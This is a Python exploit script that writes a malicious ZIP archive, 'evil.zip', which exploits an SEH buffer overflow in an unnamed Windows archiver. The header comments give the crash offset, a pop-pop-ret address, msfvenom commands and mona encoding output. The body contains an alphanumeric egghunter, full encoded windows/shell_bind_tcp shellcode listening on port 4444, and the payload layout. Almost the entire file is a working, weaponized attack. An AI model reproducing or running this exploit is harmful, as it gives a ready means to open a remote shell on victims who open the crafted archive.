#!/usr/bin/python

#####################################################
## WriTTen By: van6uard
## Dustin Silveri
## Tested on Windows Vista x86 Ultimate
##
##                        ________                      .___
## ___  _______    ____  /  _____/__ _______ _______  __| _/
## \  \/ /\__  \  /    \/   __  \|  |  \__  \\_  __ \/ __ | 
##  \   /  / __ \|   |  \  |__\  \  |  // __ \|  | \/ /_/ | 
##   \_/  (____  /___|  /\_____  /____/(____  /__|  \____ | 
##             \/     \/       \/           \/           \/
##
## offset is at 292 overwrites seh
## badchars = only alphanumeric
## 0x00425631  is poppopret
##
## cat egghunter.bin 
## "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
## "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
##
## msfvenom -p generic/custom PAYLOADFILE=egg.bin -e x86/alpha_mixed BufferRegister=EAX -a x86 --platform Windows      
## Found 1 compatible encoders
## Attempting to encode payload with 1 iterations of x86/alpha_mixed
## x86/alpha_mixed succeeded with size 118 (iteration=0)
## x86/alpha_mixed chosen with final size 118
## Payload size: 118 bytes
## PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIrFOq8JiofoqRCb2Jc2Bxjm6N5lguRzcDzOoHd74pFPd4NiZwnOPuXjnOqeIw9okWAA
## 
## msfvenom -p windows/shell_bind_tcp LPORT=4444 -e x86/alpha_mixed -a x86 --platform windows -f py -v shellcode
## Found 1 compatible encoders
## Attempting to encode payload with 1 iterations of x86/alpha_mixed
## x86/alpha_mixed succeeded with size 718 (iteration=0)
## x86/alpha_mixed chosen with final size 718
## Payload size: 718 bytes
## Final size of py file: 3848 bytes
##
## !mona encode -t alphanum -s '\xa9\xfa\x12\x00'
## stick the address of the start of shellcode egghunter in eax
## Stack Alignment to EAX
## 
## Results:
## --------
##   %JMNU : \x25\x4a\x4d\x4e\x55 : AND EAX,0x554E4D4A
##   %521* : \x25\x35\x32\x31\x2a : AND EAX,0x2A313235
##   -%%U^ : \x2d\x25\x25\x55\x5e : SUB EAX,0x5e552525
##   -%%U^ : \x2d\x25\x25\x55\x5e : SUB EAX,0x5e552525
##   -&%V` : \x2d\x26\x25\x56\x60 : SUB EAX,0x60562526
##   P : \x50 : PUSH EAX
## 
## Full encoded string:
## --------------------
## %JMNU%521*-%%U^-%%U^-&%V`P
## 
## Full encoded hex:
## -----------------
## \x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x25\x25\x55\x5e\x2d\x25\x25\x55\x5e\x2d\x26\x25\x56\x60\x50
## Then need to jump to eax, egghunter runs, machine is pinned till it finds the egg.
#####################################################


filename = "evil.zip"

header_1 = ("\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00")

header_2 = ("\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00\x00\x00\x00\x01\x00"
"\x24\x00\x00\x00\x00\x00\x00\x00")

header_3 = ("\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
"\x12\x10\x00\x00\x02\x10\x00\x00\x00\x00")

encoded_egghunter = (
    "PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIrFOq8JiofoqRCb2Jc2Bxjm6N5lguRzcDzOoHd74pFPd4NiZwnOPuXjnOqeIw9okWAA")

shellcode =  ""
shellcode += "\x89\xe0\xda\xc3\xd9\x70\xf4\x5d\x55\x59\x49\x49"
shellcode += "\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43"
shellcode += "\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30"
shellcode += "\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30"
shellcode += "\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
shellcode += "\x79\x6c\x79\x78\x4d\x52\x73\x30\x35\x50\x77\x70"
shellcode += "\x71\x70\x6b\x39\x4a\x45\x70\x31\x6f\x30\x75\x34"
shellcode += "\x4e\x6b\x72\x70\x74\x70\x6c\x4b\x43\x62\x54\x4c"
shellcode += "\x4c\x4b\x30\x52\x42\x34\x4e\x6b\x33\x42\x74\x68"
shellcode += "\x66\x6f\x6f\x47\x52\x6a\x57\x56\x76\x51\x79\x6f"
shellcode += "\x4c\x6c\x37\x4c\x75\x31\x33\x4c\x67\x72\x44\x6c"
shellcode += "\x35\x70\x4f\x31\x7a\x6f\x76\x6d\x47\x71\x4f\x37"
shellcode += "\x38\x62\x38\x72\x76\x32\x70\x57\x6c\x4b\x52\x72"
shellcode += "\x42\x30\x6c\x4b\x43\x7a\x65\x6c\x4e\x6b\x70\x4c"
shellcode += "\x36\x71\x73\x48\x79\x73\x73\x78\x75\x51\x78\x51"
shellcode += "\x56\x31\x4c\x4b\x33\x69\x37\x50\x53\x31\x69\x43"
shellcode += "\x6e\x6b\x63\x79\x75\x48\x6b\x53\x66\x5a\x53\x79"
shellcode += "\x4e\x6b\x45\x64\x6c\x4b\x36\x61\x4b\x66\x74\x71"
shellcode += "\x4b\x4f\x4c\x6c\x6f\x31\x7a\x6f\x36\x6d\x57\x71"
shellcode += "\x49\x57\x50\x38\x6b\x50\x44\x35\x7a\x56\x44\x43"
shellcode += "\x51\x6d\x78\x78\x67\x4b\x51\x6d\x46\x44\x73\x45"
shellcode += "\x7a\x44\x61\x48\x6e\x6b\x42\x78\x44\x64\x63\x31"
shellcode += "\x4a\x73\x31\x76\x4c\x4b\x44\x4c\x32\x6b\x6e\x6b"
shellcode += "\x33\x68\x57\x6c\x53\x31\x4e\x33\x4e\x6b\x76\x64"
shellcode += "\x6c\x4b\x57\x71\x68\x50\x4e\x69\x61\x54\x36\x44"
shellcode += "\x44\x64\x63\x6b\x73\x6b\x70\x61\x71\x49\x71\x4a"
shellcode += "\x52\x71\x39\x6f\x79\x70\x31\x4f\x71\x4f\x30\x5a"
shellcode += "\x6e\x6b\x42\x32\x6a\x4b\x4c\x4d\x61\x4d\x45\x38"
shellcode += "\x47\x43\x77\x42\x67\x70\x65\x50\x30\x68\x54\x37"
shellcode += "\x44\x33\x70\x32\x51\x4f\x71\x44\x72\x48\x32\x6c"
shellcode += "\x73\x47\x57\x56\x66\x67\x49\x6f\x78\x55\x6d\x68"
shellcode += "\x5a\x30\x43\x31\x45\x50\x35\x50\x37\x59\x4a\x64"
shellcode += "\x43\x64\x70\x50\x53\x58\x65\x79\x4f\x70\x72\x4b"
shellcode += "\x53\x30\x79\x6f\x6b\x65\x73\x5a\x65\x58\x66\x39"
shellcode += "\x76\x30\x6a\x42\x6b\x4d\x77\x30\x32\x70\x57\x30"
shellcode += "\x50\x50\x55\x38\x68\x6a\x36\x6f\x39\x4f\x79\x70"
shellcode += "\x59\x6f\x58\x55\x7a\x37\x50\x68\x75\x52\x57\x70"
shellcode += "\x47\x61\x63\x6c\x4e\x69\x6b\x56\x50\x6a\x72\x30"
shellcode += "\x73\x66\x52\x77\x55\x38\x48\x42\x69\x4b\x55\x67"
shellcode += "\x45\x37\x49\x6f\x4b\x65\x56\x37\x42\x48\x48\x37"
shellcode += "\x59\x79\x37\x48\x69\x6f\x49\x6f\x6b\x65\x30\x57"
shellcode += "\x45\x38\x61\x64\x68\x6c\x75\x6b\x49\x71\x49\x6f"
shellcode += "\x79\x45\x36\x37\x4e\x77\x53\x58\x43\x45\x70\x6e"
shellcode += "\x30\x4d\x53\x51\x69\x6f\x39\x45\x72\x48\x35\x33"
shellcode += "\x42\x4d\x30\x64\x35\x50\x4e\x69\x59\x73\x51\x47"
shellcode += "\x30\x57\x66\x37\x66\x51\x38\x76\x30\x6a\x64\x52"
shellcode += "\x73\x69\x62\x76\x49\x72\x49\x6d\x30\x66\x39\x57"
shellcode += "\x33\x74\x66\x44\x57\x4c\x55\x51\x37\x71\x6c\x4d"
shellcode += "\x70\x44\x56\x44\x52\x30\x48\x46\x53\x30\x63\x74"
shellcode += "\x66\x34\x50\x50\x76\x36\x71\x46\x71\x46\x33\x76"
shellcode += "\x72\x76\x50\x4e\x70\x56\x33\x66\x52\x73\x42\x76"
shellcode += "\x32\x48\x61\x69\x58\x4c\x77\x4f\x6c\x46\x79\x6f"
shellcode += "\x39\x45\x6b\x39\x49\x70\x70\x4e\x56\x36\x32\x66"
shellcode += "\x39\x6f\x54\x70\x51\x78\x46\x68\x6d\x57\x77\x6d"
shellcode += "\x45\x30\x69\x6f\x4e\x35\x4d\x6b\x5a\x50\x58\x35"
shellcode += "\x79\x32\x31\x46\x45\x38\x6f\x56\x6e\x75\x4f\x4d"
shellcode += "\x6f\x6d\x59\x6f\x79\x45\x65\x6c\x65\x56\x61\x6c"
shellcode += "\x67\x7a\x6f\x70\x4b\x4b\x6b\x50\x71\x65\x35\x55"
shellcode += "\x4d\x6b\x42\x67\x67\x63\x71\x62\x42\x4f\x63\x5a"
shellcode += "\x45\x50\x46\x33\x39\x6f\x4a\x75\x41\x41"

egg = "w00tw00t"

bomb = egg + shellcode

alignment = "\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x72\x56\x4e\x55\x2d\x72\x56\x4e\x55\x2d\x73\x58\x50\x55\x50"
alignment += "\x98\x85"                     # jmp to eax.  mangled bytes turn 98 into ff and 85 into e0

# 292 is offset
payload = "A"*29
payload += encoded_egghunter
payload += "B"*(292-123-29-len(encoded_egghunter))
payload += alignment
payload += "C"*(123-len(alignment))              # need to align here
payload += "\x89\x9f\x41\x41"                    # jmp 9f converts to 83
#payload += "\x4c\x4c\x77\x9F"                   # conditional jump with bad char. 9f mangles to 83 is alternate if previous doesn't work
payload += "\x33\x28\x42\x00"                    # 00422833  POP POP RET
payload += bomb
payload += "D"*(4064-292-4-4-len(bomb))
payload += ".txt"

exploit = header_1 + payload + header_2 + payload + header_3

textfile = open(filename, 'w')
textfile.write(exploit)
textfile.close()

